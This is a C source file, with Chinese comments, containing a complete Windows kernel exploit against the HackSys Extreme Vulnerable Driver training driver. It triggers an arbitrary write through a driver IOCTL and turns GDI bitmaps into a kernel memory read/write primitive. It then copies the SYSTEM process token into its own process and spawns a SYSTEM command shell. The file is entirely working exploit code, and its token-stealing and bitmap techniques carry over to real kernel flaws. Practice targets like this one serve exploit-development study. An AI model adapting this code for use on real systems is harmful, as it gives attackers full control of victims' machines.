#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <profileapi.h>
DWORD64 buf[0xf00]{};
HANDLE hDriver;
DWORD dwBytesOut = 0;
typedef struct _PEB {
	UCHAR ignored[0xf8];
	PVOID64 GdiSharedHandleTable;//  +0x0f8 GdiSharedHandleTable : Ptr64 Void
} PEB, *PPEB;
typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PPEB PebBaseAddress; // 接收进程环境块地址
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;// 接收进程ID
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;
typedef enum _PROCESSINFOCLASS {
	SystemProcessBasicInformation = 0
} PROCESSINFOCLASS;
typedef NTSTATUS(WINAPI *PNtQueryInformationProcess)(
	_In_      HANDLE           ProcessHandle,
	_In_      PROCESSINFOCLASS ProcessInformationClass,
	_Out_     PVOID            ProcessInformation,
	_In_      ULONG            ProcessInformationLength,
	_Out_opt_ PULONG           ReturnLength
	);
typedef struct _GDICELL
{
	PVOID pKernelAddress;
	USHORT wProcessId;
	USHORT wCount;
	USHORT wUpper;
	USHORT wType;
	PVOID pUserAddress;
} GDICELL, *PGDICELL;
LONG ReadMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
	if (SetBitmapBits(hManager, sizeof(PVOID), &src) == 0) {
		printf("[-] Unable To Set Source Address: 0x%p\n", src);
		return FALSE;
	}
	return GetBitmapBits(hWorker, len, dest) ? TRUE : FALSE;
}
LONG WriteMemory(HBITMAP hManager, HBITMAP hWorker, PVOID src, PVOID dest, DWORD len) {
	if (SetBitmapBits(hManager, len,&src) == 0) {
		printf("[-] Unable To Set Source Address: 0x%p\n", src);
		return FALSE;
	}
	return SetBitmapBits(hWorker, len, &dest) ? TRUE : FALSE;
}
int main() {
	//获取PEB基地址
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQueryInformationProcess query = (PNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	LoadLibraryA("gdi32.dll");
	ULONG dwReturned = 0;
	PROCESS_BASIC_INFORMATION processBasicInfo = { 0x0 };
	NTSTATUS status = query(GetCurrentProcess(), SystemProcessBasicInformation, &processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), &dwReturned);
	PPEB peb = (PPEB)HeapAlloc(GetProcessHeap(), 0, sizeof(PEB));
	ReadProcessMemory(GetCurrentProcess(), processBasicInfo.PebBaseAddress, peb, sizeof(PEB), NULL);
	printf("PEB=%llX\n", processBasicInfo.PebBaseAddress);
	PVOID64 GdiSharedHandleTable = peb->GdiSharedHandleTable;
	printf("GdiSharedHandleTable=%llX\n", GdiSharedHandleTable);
	
	HBITMAP hManager = CreateBitmap(123,123, 1, 1, 0);
	HBITMAP hWorker = CreateBitmap(123,123, 1, 1, 0);
	GDICELL *cells;//GdiSharedHandleTable这个表存放着指向每个Bitmap对应的GDICELL64结构的指针
	WORD index;
	index = LOWORD(hManager);
	cells = (GDICELL *)(peb->GdiSharedHandleTable);
	PVOID64 pKernelAddress = cells[index].pKernelAddress;
	buf[1] = ((ULONG64)pKernelAddress + 0x50);
	printf("hManagerpvScan0=%llX\n", buf[1]);
	index = LOWORD(hWorker);
	pKernelAddress = cells[index].pKernelAddress;
	ULONG64 temp = ((ULONG64)pKernelAddress + 0x50);
	buf[0] = (ULONG64)&temp;
	printf("hWorkerpvScan0=%llX\n", *(ULONG64*)*buf);

	hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf("[!] Unable to get a handle on the device\n"); return(-1); }
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Unable to get a handle on the device\n");
		getchar();
		return(-1);
	}
	//修改结构体指针
	DeviceIoControl(hDriver, 0x22200b, buf, 0x10, 0, 0, &dwBytesOut, NULL);


	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	TCHAR lpfileName[1024];
	PVOID64 UserBase;
	HMODULE nbase;
	ULONG64 address;
	ULONG64 PsInitialSystemProcess;
	//遍历模块
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	//获取第一个模块地址
	GetDeviceDriverBaseName(lpImageBase[0], lpfileName, 48);
	UserBase = lpImageBase[0];
	nbase = LoadLibrary(L"ntoskrnl.exe");
	printf("UserBase=%llX\n", UserBase);
	address = (ULONG64)GetProcAddress(nbase, "PsInitialSystemProcess");
	//PsInitialSystemProcess 是一个指向system EPROCESS的指针
	PsInitialSystemProcess = ((ULONG64)address - (ULONG64)nbase + (ULONG64)UserBase);
	printf("PsInitialSystemProcess=%llX\n", PsInitialSystemProcess);

	LIST_ENTRY ActiveProcessLinks{};
	DWORD64 currentProcess;//当前进程eporcess
	ULONG64 UniqueProcessId;
	ULONG64 SystemProcess{};

	ReadMemory(hManager, hWorker, (PVOID)PsInitialSystemProcess,
		&SystemProcess, sizeof(LPVOID));
	printf("SystemEProcess=%llX\n", SystemProcess);
	DWORD dwCurrentPID;
	//+0x2f0 ActiveProcessLinks : _LIST_ENTRY
	ReadMemory(hManager, hWorker, (PVOID)(SystemProcess + 0x2f0), &ActiveProcessLinks, sizeof(LIST_ENTRY));
	do	
	{
		currentProcess = (DWORD64)((PUCHAR)ActiveProcessLinks.Flink - 0x2f0);
		ReadMemory(hManager, hWorker, (PVOID)(currentProcess + 0x2e8), &UniqueProcessId, sizeof(LPVOID));
		dwCurrentPID = LOWORD(UniqueProcessId);
		ReadMemory(hManager, hWorker, (PVOID)(currentProcess + 0x2f0), &ActiveProcessLinks, sizeof(LIST_ENTRY));
	} while (dwCurrentPID != GetCurrentProcessId());
	ULONG64 systemtoken{};
	//+0x358 Token            : _EX_FAST_REF
	printf("eProcessToken=%llX\n", currentProcess+ 0x358);
	ReadMemory(hManager, hWorker, (PVOID)(SystemProcess + 0x358),
		&systemtoken, sizeof(LPVOID));
	printf("systemtoken=%llX\n", systemtoken);
	WriteMemory(hManager, hWorker, (PVOID)(currentProcess + 0x358),
		(PVOID)systemtoken, sizeof(LPVOID));

	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	getchar();
	return 0;
}
